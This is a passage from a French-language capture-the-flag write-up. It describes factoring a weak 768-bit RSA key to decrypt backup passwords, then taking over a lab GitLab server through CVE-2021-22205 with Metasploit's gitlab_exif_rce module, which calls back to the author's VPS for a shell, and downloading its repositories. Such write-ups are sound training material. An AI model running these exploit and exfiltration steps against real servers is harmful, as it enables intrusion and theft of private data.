Resolving deltas: 100% (6/6), done.
```

Maintenant , on va utiliser ``GIT GUI`` sur Windows pour explorer le ``.git``
Dans les commits, on trouve :

![AltText](./img/commit.png)

Flag : ``jordan.alisto@outlook.fr``


---

## Backup key

- **Nom**  : Backup key
- **Point** : 40
- **Description** :
  ```bash
  During a previous operation we recovered elements related to their backup system. Unfortunately, we did not succeed in decrypting them. Find us the key, it must be somewhere!
  ```

###### Solution:
On peut se reconnecter sur le premier ssh auquel on a eu accés .

```bash
harvester@harvester:/$ ls
backups  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
harvester@harvester:/$ ls /backups/
backup-log-1.log.zip  backup-log-2.log.zip  backup-log-3.log.zip  backup.sh  password.enc
```

On trouve un dossier ``backups``
De plus dans ``opt`` , on retrouve un dossier similaire

```bash
harvester@harvester:/opt$ ls
backups
harvester@harvester:/opt$ ls backups/
backup.pub  test-backup.sh  test.txt  test.txt.enc
harvester@harvester:/opt$
```

Voici le script de chiffrement, il utilise openssl
```bash
harvester@harvester:/opt/backups$ cat test-backup.sh
#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "[-] Error. Usage : ./test-backup.sh <file-to-backup>"
else
    cat $1 | openssl rsautl -encrypt -pubin -inkey backup.pub | base64 | tr -d '\n' > $1.enc
fi
```

On nous fournit aussi une clée Publique :

```bash
-----BEGIN PUBLIC KEY-----
MHwwDQYJKoZIhvcNAQEBBQADawAwaAJhAMrZhFV8l+A5Qxoiatcn8MbUPvPUGEaf
GzdQSbIphD7p+Dsfl3OKwnT19h9AHyHxkT5LZLsxtVo405jA3+0AsTkvCIlxHESz
WeeXbGF/zHNPBuPpXCZHYJG1L0YueUE9tQIDAQAB
-----END PUBLIC KEY-----
```

C'est ici un challenge de crypto basique .
On doit casser la clé publique pour ainsi reconstruire la clé privée et donc décoder le fichier **.enc**

Pour résoudre ce challenge, il faut les Connaissances basiques du [chiffrement RSA](https://fr.wikipedia.org/wiki/Chiffrement_RSA)

On récupère le module N:

```bash
root@DESKTOP-HNQJECB: /root/Desktop
➜ openssl rsa -noout -text -inform PEM -in key.pub -pubin -modulus
RSA Public-Key: (768 bit)
Modulus:
    00:ca:d9:84:55:7c:97:e0:39:43:1a:22:6a:d7:27:
    f0:c6:d4:3e:f3:d4:18:46:9f:1b:37:50:49:b2:29:
    84:3e:e9:f8:3b:1f:97:73:8a:c2:74:f5:f6:1f:40:
    1f:21:f1:91:3e:4b:64:bb:31:b5:5a:38:d3:98:c0:
    df:ed:00:b1:39:2f:08:89:71:1c:44:b3:59:e7:97:
    6c:61:7f:cc:73:4f:06:e3:e9:5c:26:47:60:91:b5:
    2f:46:2e:79:41:3d:b5
Exponent: 65537 (0x10001)
Modulus=CAD984557C97E039431A226AD727F0C6D43EF3D418469F1B375049B229843EE9F83B1F97738AC274F5F61F401F21F1913E4B64BB31B55A38D398C0DFED00B1392F0889711C44B359E7976C617FCC734F06E3E95C26476091B52F462E79413DB5
```

On le récupère en nombre avec python :

```python
>>> 0xCAD984557C97E039431A226AD727F0C6D43EF3D418469F1B375049B229843EE9F83B1F97738AC274F5F61F401F21F1913E4B64BB31B55A38D398C0DFED00B1392F0889711C44B359E7976C617FCC734F06E3E95C26476091B52F462E79413DB5

1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413
```

On doit maintenant retrouver **p** et **q** qui sont les facteurs premiers de la clé .
On peut par exemple utiliser mon Tool : [Facto4CTF](https://github.com/Vozec/Facto4CTF) qui permet de factoriser des nombres trés grand avec plusieurs  algorithmes différent .

http://www.factordb.com/ fonctionne aussi très bien mais ``pourquoi utiliser factorDB quand on peut utiliser des courbes elliptiques ?``

On obtient :
```bash
p = 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489
q = 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917
```

On utilise [RsaTool](https://github.com/ius/rsatool) pour reconstruire la clé !

```bash
python3 rsatool.py -n 1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389
956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413 -p 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489 -q 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917 -e 65537  -o privkey.key
```

Finalement, on a la ``privekey.key``

```
-----BEGIN RSA PRIVATE KEY-----
MIIBywIBAAJhAMrZhFV8l+A5Qxoiatcn8MbUPvPUGEafGzdQSbIphD7p+Dsfl3OK
wnT19h9AHyHxkT5LZLsxtVo405jA3+0AsTkvCIlxHESzWeeXbGF/zHNPBuPpXCZH
YJG1L0YueUE9tQIDAQABAmB0DeSHYEQoNbqtXhmQRTqdFtt5dtP4u5i/mcDAHL6b
nBK4CMgGg9HjRsFseawWKHTyjKYQwbl+Xh/66VclzgxrAxw+GIsXGHp5OzIsxABM
Vo52ybJYVC6iotbs1GL/9AECMQDZgux7RA4oadJTXlH5G6zD6266BC4Qbm+HXD0X
5T22X//W5OmjYITOYPg9dU3X9wECMQDuvm3SPOfpnA4iSf7MRBjDSvdOQYv6cUw3
kYKEFKsY8y/X4JMGKkmwMCJcyEX5mrUCMQCXWi353DJJ1tDe6Bv8TlCah+GlmLEB
CAedVgbA8OhPVl+tBd65q7jd7sXt5glDxQECMQCnEe/8Xc7U9fYWHL4H5+eEUuO5
ibkRK1Pw1w0ErQoGzbe/VFLOz6z9dNG3KBd/0rkCMH6J+q8/eK2Vi+vGXc92zSHp
lI4rshqBvhCfrDcrtBuu7b38Z1dz+ky1xc4ZO17bnA==
-----END RSA PRIVATE KEY-----
```

On peut l'upload en la copiant collant et on peut décoder le fichier : ``/backups/password.enc``

```bash
chmod 400 /tmp/privekey.pem
cat /backups/password.enc | base64 -d > /tmp/decoded_bytes| openssl rsautl -decrypt -in /tmp/decoded_bytes -out /tmp/decoded.txt -inkey /tmp/privkey.pem
```

On obtient la clé , qui est aussi le flag : ``RlUiPP2zI5v3uZiqKPej``

###### Bonus : Déchiffrement des backups

Voici le script qui a chiffré les backups :
```bash
harvester@harvester:/backups$ cat backup.sh
#!/bin/bash
# Please use the password in password.enc for safety. Ask the bigboss for questions.

if [ "$#" -ne 2 ]; then
    echo "[-] Error. Usage : ./backup.sh <file-to-backup> <password>"
else
    # TODO : replace password encryption by public key encryption.
    zip -P $2 $1.zip $1
fi
```

On voit que c'est un zip avec un mot de passe. Malheureusement , nous n'avons pas de binaire sur la machine qui nous permette d'extraire les fichiers .
On va donc utiliser python !

```python
from zipfile import ZipFile

file_name = ["backup-log-1.log.zip","backup-log-2.log.zip","backup-log-3.log.zip"]

for name in file_name:
    with ZipFile(name, 'r') as zip:
        zip.printdir()
        zip.extractall('/tmp/1',pwd=b'RlUiPP2zI5v3uZiqKPej')
        print('Done!')
```
Dans les fichiers , on trouve un **Hint** :
```
[HINT] Congratz you found me ! Post exploit is always important. Here's a gift to help you move forward on the challenge. : "Im your father !"
```
C'est un Hint pour un des challenges précédent : Celui avec **Empire**

---

## Financial statement

- **Nom**  : Financial statement
- **Point** : 0
- **Description** :
  ```bash
  We need more information to continue our investigation. We are confident that their financial operations are beyond our control. Find out more about their 2021 financials and their victims!
  The flag is the total number of their income in 2021.
  ```

###### Solution:

On va ici revenir sur le nmap du début du ctf :

```bash
Nmap scan report for 192.168.51.2
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) #Inconnu

Nmap scan report for 192.168.51.3
5432/tcp open       PostgreSQL DB 9.6.0 or later

Nmap scan report for 192.168.51.5
22/tcp   open  ssh
80/tcp   open  http             # GITLAB
8181/tcp open  intermapper      # Gestion de serveur = intermapper

Nmap scan report for 10.14.1.1 // 192.168.51.1
22/tcp   open  ssh
80/tcp   open  http             # Page Phising microsoft
3000/tcp open  ppp              # Login Custom
8000/tcp open  http-alt         # phpmyadmin

Nmap scan report for 10.14.1.2
2048/tcp open  caldav  # Intéressant
```

Le GitLab en ``192.168.51.5`` sur le port ``80`` n'a pas encore était exploré

A ce stade du ctf , j'ai tenté beaucoup de choses , bruteforce de login , détection de vulnérabilité sur le serveur , etc ..
Finalement , il se trouve qu'il est **vulnérable** à la ``CVE-2021-22205`` qui concerne les exifs .

Par chance, metasploit nous présente encore une fois un exploit rapide à mettre en place !

```bash
proxychains msfconsole -q
search gitlab
use multi/http/gitlab_exif_rce
set RHOSTS 192.168.51.5
set SRVPORT 1337
set LHOST ip_vps..
exploit
```

Shell :)



Maintenant, le but va être de copié et de déchiffrer les fichiers du gitlab .
**2 Solutions** s'offrent à nous :
- ``Monter un Gitlab en local et importer les fichiers``
- ``Copié les fichiers et tenter de les décoder comme un margoulin x)``

Spoiler : Je prend l'option 2 !!

Aprés avoir passé 2h à tenter de monter un docker et d'y importer les fichiers sans succés .

Les fichiers sont situés en : ``/home/git/data/repositories/@hashed``
Grâce au shell meterpreter , on peut tous télécharger:


```
download /home/git/data/repositories/
```

Si on regarde l'arborescence , on peut voir quelque chose :

![AltText](./img/git.png)

Oui des ``git`` !

On peut lancer une console [``gitlab-rails``](https://docs.gitlab.com/ee/administration/operations/rails_console.html) afin d'identifier le nom des répos.

On tape :

```
ProjectRepository.find_by(disk_path: '@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a').project
ProjectRepository.find_by(disk_path: '@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce').project
ProjectRepository.find_by(disk_path: '@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b').project
ProjectRepository.find_by(disk_path: '@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35').project
ProjectRepository.find_by(disk_path: '@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d').project
```

On obtient un nom intéressant : ``Add accounting sheet (2021)``

On peut le vérifier en se rendant dans le dossier :

```bash
root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:(master)
➜   git log
```

![AltText](./img/git2.png)

Intéressant :) . On peut essayer de récupérer le fichier :

```bash
root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:(master)
➜   git checkout .
fatal: this operation must be run in a work tree
```

Hum .. Une recherche rapide et on trouve cet [article](https://technoteshelp.com/git-fatal-this-operation-must-be-run-in-a-work-tree/)

```bash
root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:(master)
➜   git --work-tree=. checkout master
Already on 'master'
root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:(master)
➜   ls
accounting-2021.xlsx  branches  config  description  HEAD  hooks  index  info  language-stats.cache  logs  objects  refs
```


On a : ``accounting-2021.xlsx`` !
En l'ouvrant :

```
Company	Amount	Paid
Biboy	54000	yes
Tyro	31999	yes
Strawton	9000	no
Tipo	863789	yes
Opo	8231	no
Miuop	87688	yes
```

On somme tous ceux qui ont étaient payés et on a enfin le dernier flag ! ``1037476``

---

# Conclusion
C'était un super CTF, je n'avais jamais fait ce genre de compétition avec un réseau de la sorte ou toutes les machines communiquent entre elles et ou on joue dans ce genre de lab. Ça change des challenges classiques : RCE > PRIVESC > FLAG > CHALL. SUIVANT.
Encore un grand bravo [Intrinsec]( https://www.intrinsec.com/) et à [Th1b4ud](https://twitter.com/th1b4ud)  qui à tous géré solo pendant la compétition . A refaire !

Par ailleurs , je suis fier d'avoir fini premier au classement !
![Alttext](./img/scoreboard.png)
